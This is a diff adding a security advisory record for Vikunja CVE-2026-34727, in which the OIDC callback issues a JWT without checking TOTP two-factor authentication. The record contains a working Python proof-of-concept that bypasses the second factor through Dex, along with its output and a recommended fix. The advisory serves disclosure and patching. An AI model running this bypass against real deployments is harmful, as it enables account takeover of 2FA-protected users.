@@ -1,0 +1,62 @@
+{
+  "id": "GHSA-8jvc-mcx6-r4cg",
+  "modified": "2026-04-10T19:50:14.202449Z",
+  "published": "2026-04-10T15:30:57Z",
+  "aliases": [
+    "CVE-2026-34727"
+  ],
+  "summary": "Vikunja has TOTP Two-Factor Authentication Bypass via OIDC Login Path",
+  "details": "## Summary\n\nThe OIDC callback handler issues a full JWT token without checking whether the matched user has TOTP two-factor authentication enabled. When a local user with TOTP enrolled is matched via the OIDC email fallback mechanism, the second factor is completely skipped.\n\n## Details\n\nThe OIDC callback at `pkg/modules/auth/openid/openid.go:185` issues a JWT directly after user lookup:\n\n```go\nreturn auth.NewUserAuthTokenResponse(u, c, false)\n```\n\nThere are zero references to TOTP in the entire `pkg/modules/auth/openid/` directory. By contrast, the local login handler at `pkg/routes/api/v1/login.go:79-102` correctly implements TOTP verification:\n\n```go\ntotpEnabled, err := user2.TOTPEnabledForUser(s, user)\nif totpEnabled {\n    if u.TOTPPasscode == \"\" {\n        _ = s.Rollback()\n        return user2.ErrInvalidTOTPPasscode{}\n    }\n    _, err = user2.ValidateTOTPPasscode(s, \u0026user2.TOTPPasscode{\n        User:     user,\n        Passcode: u.TOTPPasscode,\n    })\n```\n\nWhen OIDC `EmailFallback` maps to a local user who has TOTP enabled, the TOTP enrollment is ignored and a full JWT is issued without any second-factor challenge.\n\n## Proof of Concept\n\nTested on Vikunja v2.2.2 with Dex as the OIDC provider.\n\nSetup:\n- Vikunja configured with `emailfallback: true` for Dex\n- Local user `alice` (id=1) has TOTP enabled\n\n```python\nimport requests, re, html\nfrom urllib.parse import parse_qs, urlparse\n\nTARGET = \"http://localhost:3456\"\nDEX = \"http://localhost:5556\"\nAPI = f\"{TARGET}/api/v1\"\n\n# verify TOTP is required for local login\nr = requests.post(f\"{API}/login\",\n    json={\"username\": \"alice\", \"password\": \"Alice1234!\"})\nprint(f\"Local login without TOTP: {r.status_code} code={r.json().get('code')}\")\n# Output: 412 code=1017 (TOTP required)\n\n# login via OIDC (same flow as VIK-020 PoC)\ns = requests.Session()\nr = s.get(f\"{DEX}/dex/auth?client_id=vikunja\"\n          f\"\u0026redirect_uri={TARGET}/auth/openid/dex\"\n          f\"\u0026response_type=code\u0026scope=openid+profile+email\u0026state=x\")\naction = html.unescape(re.search(r'action=\"([^\"]*)\"', r.text).group(1))\nif not action.startswith(\"http\"): action = DEX + action\nr = s.post(action, data={\"login\": \"alice@test.com\", \"password\": \"password\"},\n           allow_redirects=False)\napproval_url = DEX + r.headers[\"Location\"]\nr = s.get(approval_url)\nreq = re.search(r'name=\"req\" value=\"([^\"]*)\"', r.text).group(1)\nr = s.post(approval_url, data={\"req\": req, \"approval\": \"approve\"},\n           allow_redirects=False)\ncode = parse_qs(urlparse(r.headers[\"Location\"]).query)[\"code\"][0]\n\nresp = requests.post(f\"{API}/auth/openid/dex/callback\",\n    json={\"code\": code, \"redirect_url\": f\"{TARGET}/auth/openid/dex\"})\nprint(f\"OIDC login: {resp.status_code}\")\n\nuser = requests.get(f\"{API}/user\",\n    headers={\"Authorization\": f\"Bearer {resp.json()['token']}\"}).json()\nprint(f\"User: id={user['id']} username={user['username']}\")\n# TOTP was completely bypassed\n```\n\nOutput:\n```\nLocal login without TOTP: 412 code=1017\nOIDC login: 200\nUser: id=1 username=alice\n```\n\nLocal login correctly requires TOTP (412), but the OIDC path issued a JWT for alice without any TOTP challenge.\n\n## Impact\n\nWhen an administrator enables OIDC with `EmailFallback`, any user who has enrolled TOTP two-factor authentication on their local account can have that protection completely bypassed. An attacker who can authenticate to the OIDC provider with a matching email address gains full access without any second-factor challenge. This undermines the security guarantee of TOTP enrollment.\n\nThis vulnerability is a prerequisite chain with the OIDC email fallback account takeover (missing `email_verified` check). Together, they allow an attacker to bypass both the password and the TOTP second factor.\n\n## Recommended Fix\n\nAdd a TOTP check in the OIDC callback before issuing the JWT:\n\n```go\ntotpEnabled, err := user.TOTPEnabledForUser(s, u)\nif err != nil {\n    _ = s.Rollback()\n    return err\n}\nif totpEnabled {\n    _ = s.Rollback()\n    return echo.NewHTTPError(http.StatusForbidden,\n        \"TOTP verification required. Please use the local login endpoint.\")\n}\nreturn auth.NewUserAuthTokenResponse(u, c, false)\n```\n\n---\n*Found and reported by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.3.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.2.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-8jvc-mcx6-r4cg/GHSA-8jvc-mcx6-r4cg.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8jvc-mcx6-r4cg"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34727"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/pull/2582"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/b642b2a4536a3846e627a78dce2fdd1be425e6a1"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0"
+    }
+  ]
+}
